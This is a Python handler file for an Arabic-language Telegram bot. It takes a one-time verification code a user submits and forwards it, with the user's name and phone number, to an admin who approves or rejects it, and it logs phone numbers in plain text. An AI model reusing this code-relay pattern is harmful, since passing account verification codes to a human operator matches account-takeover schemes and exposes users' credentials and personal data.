# handlers/otp_handler.py
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CallbackContext
from config import users, ADMIN_ID
import logging

# Setup logging (same as main.py)
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# Messages (subset from main.py)
MESSAGES = {
    "otp_received": "تم استلام رمز التحقق. في انتظار موافقة المشرف.",
    "no_phone": "لم ترسل رقم هاتف بعد.",
}

ADMIN_MESSAGES = {
    "otp_submission": "أرسل المستخدم {} رمز التحقق: {} لرقم {}.\nالموافقة أو الرفض؟",
}

def log_user_state(user_id, message=""):
    """Log user state for debugging"""
    if user_id in users:
        state_info = f"User ID: {user_id}, Name: {users[user_id].get('name', 'None')}, "
        state_info += f"Approved: {users[user_id].get('approved', False)}, "
        state_info += f"Phones: {users[user_id].get('phones', [])}, "
        state_info += f"OTP Verified Numbers: {users[user_id].get('otp_verified_numbers', [])}"
        if message:
            state_info = f"{message}: {state_info}"
        logger.info(state_info)

async def handle_otp(update: Update, context: CallbackContext) -> int:
    """Handle user OTP submission"""
    user_id = update.effective_user.id
    
    log_user_state(user_id, "OTP submission attempt")
    
    if user_id in users and users[user_id]["current_phone"]:
        otp = update.message.text
        users[user_id]["current_otp"] = otp
        users[user_id]["state"] = 6  # WAITING_OTP_APPROVAL
        await update.message.reply_text(MESSAGES["otp_received"])
        
        keyboard = [
            [
                InlineKeyboardButton("موافقة", callback_data=f"approve_otp_{user_id}"), 
                InlineKeyboardButton("رفض", callback_data=f"reject_otp_{user_id}")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        try:
            await context.bot.send_message(
                ADMIN_ID, 
                ADMIN_MESSAGES["otp_submission"].format(users[user_id]["name"], otp, users[user_id]["current_phone"]), 
                reply_markup=reply_markup
            )
            log_user_state(user_id, "OTP submitted and admin notified")
        except Exception as e:
            logger.error(f"Failed to notify admin: {str(e)}")
            await update.message.reply_text("خطأ أثناء إرسال الطلب للمشرف. حاول مرة أخرى.")
            return 5  # OTP state
        
        return 6  # WAITING_OTP_APPROVAL
    else:
        from handlers.phone_handler import handle_phone  # Import here to avoid circular dependency
        return await handle_phone(update, context)